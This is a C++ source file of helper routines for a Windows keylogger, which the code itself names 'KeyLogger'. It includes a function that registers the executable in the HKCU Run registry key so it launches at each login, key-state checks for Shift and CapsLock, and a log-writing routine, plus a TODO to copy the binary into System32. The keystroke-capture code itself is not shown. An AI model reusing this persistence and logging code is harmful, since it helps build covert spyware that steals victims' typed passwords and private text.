#include "functions.h"

using namespace std;

string intToString(int i){
	char buffer[4];
	_itoa_s(i, buffer, 10);
	return string(buffer);
}

string getCurrDir(){
	char *curdir = new char[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, curdir);
	string rv(curdir);
	delete[] curdir;
	return rv;
}

string getSelfPath(){
	char selfpath[MAX_PATH];
	GetModuleFileName(NULL, selfpath, MAX_PATH);
	return string(selfpath);
}

string dirBasename(string path){
	if(path.empty())
		return string("");
	
	if(path.find("\\") == string::npos)
		return path;
	
	if(path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);
	
	size_t pos = path.find_last_of("\\");
	if(pos != string::npos)
		path = path.substr(0, pos);
	
	if(path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);
	
	return path;
}

bool isCapsLock() {
	return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;  // If the low-order bit is 1, the key is toggled
}

bool isShift() {
	return (GetKeyState(VK_SHIFT) & 0x8000) != 0; // If the high-order bit is 1, the key is down; otherwise, it is up.
}

void logFile(ofstream& outFile, string msg) {
		outFile << msg;
	#ifdef DEBUG
		cout << msg;
	#endif
}

BOOL registerStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void registerProgram() {
	wchar_t szPathToExe[MAX_PATH];
	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	// TODO copy KeyLogger.exe to C:\Windows\System32 and register C:\Windows\System32\KeyLogger.exe
	registerStartup(L"KeyLogger", szPathToExe, NULL);
}


